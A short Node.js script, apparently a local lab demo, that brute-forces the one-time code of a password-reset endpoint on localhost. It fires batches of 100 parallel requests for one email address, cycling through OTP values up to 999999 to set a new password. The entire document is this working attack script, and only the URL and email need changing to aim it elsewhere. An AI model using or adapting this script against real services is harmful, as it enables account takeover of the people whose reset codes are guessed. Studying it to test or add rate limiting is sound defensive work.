import axios from "axios";


async function sendRequest(otp){

    let data = JSON.stringify({
  "email": "sneiden@gmail.com",
  "otp": otp,
  "password": "somethingelse"
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'http://localhost:3000/reset-password',
  headers: { 
    'Content-Type': 'application/json'
  },
  data : data
};


    try{
        await axios.request(config);
    }catch(e){
        // console.log(e);
    } 

}



async function main(){
    for(let i=9999; i<=999999; i+=100){
    
        const p = [];

        for(let j=0;j < 100;j++){
            console.log(i+j);
            p.push(sendRequest((i+j).toString()));
        }

       await Promise.all(p);
    }

}

main();


// sendRequest("71203");
